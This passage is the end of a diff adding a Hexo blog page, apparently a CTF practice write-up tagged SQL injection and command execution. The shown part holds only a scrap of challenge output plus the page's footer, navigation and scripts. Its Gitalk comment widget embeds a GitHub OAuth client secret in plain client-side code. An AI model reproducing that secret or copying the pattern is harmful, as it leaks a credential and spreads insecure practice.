launched...&lt;br&gt;Cruising...&lt;br&gt;Engaging...Bull\'s-eye!&lt;br&gt;All targets are eliminated.&lt;br&gt;'&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://sunny250.github.io/2020/01/12/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%958/" data-id="ck7vssflw0012pk7e0ush9fwz"
+        class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/De1CTF/" rel="tag">De1CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wbe/" rel="tag">wbe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2020/01/24/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%959/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            buuoj刷题记录9
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/01/10/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%957/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">buuoj刷题记录7</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+
+  
+  
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'c2ff86b3b4668317d630',
+      clientSecret: '92facc954b6661c7556b845f2cb775dfb77df12c',
+      repo: 'sunny250.github.io',
+      owner: 'sunny250',
+      admin: ['sunny250'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2019-2020
+        sunny250
+      </li>
+      <li>
+        
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a> by shenyu
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <ul class="list-inline">
+  <li>PV:<span id="busuanzi_value_page_pv"></span></li>
+  <li>UV:<span id="busuanzi_value_site_uv"></span></li>
+</ul>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/logo.jpg" alt="晴天`blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives/">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/links/">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about/">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+
+  <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  </div>
+</body>
+
+</html>
